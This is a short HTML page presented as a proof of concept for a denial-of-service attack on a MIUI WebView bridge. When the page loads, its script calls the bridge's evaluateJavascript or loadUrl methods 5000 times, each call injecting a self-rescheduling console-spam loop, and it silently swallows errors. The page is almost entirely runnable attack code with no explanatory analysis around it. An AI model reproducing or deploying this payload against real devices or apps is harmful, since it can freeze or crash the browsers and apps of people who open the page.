<!doctype html>
<meta charset="utf-8">
<title>MIUI WebView DoS POC</title>
<body>
<h1>Trigger DoS via ThreadPool / LinkedBlockingQueue</h1>
<script>
(function flood(){
  try {
    // payload heavy: recursive evaluateJavascript calls
    var payload = `
      (function spam(){
        for (var i=0;i<1000;i++){
          console.log("spam-"+i);
        }
        setTimeout(spam,0);
      })();
    `;

    // Jalankan berulang-ulang ke WebView engine
    for (let i = 0; i < 5000; i++) {
      window.miui && window.miui.evaluateJavascript
        ? window.miui.evaluateJavascript(payload, null)
        : window.miui && window.miui.loadUrl("javascript:" + payload);
    }

  } catch(e) {}
})();
</script>
</body>
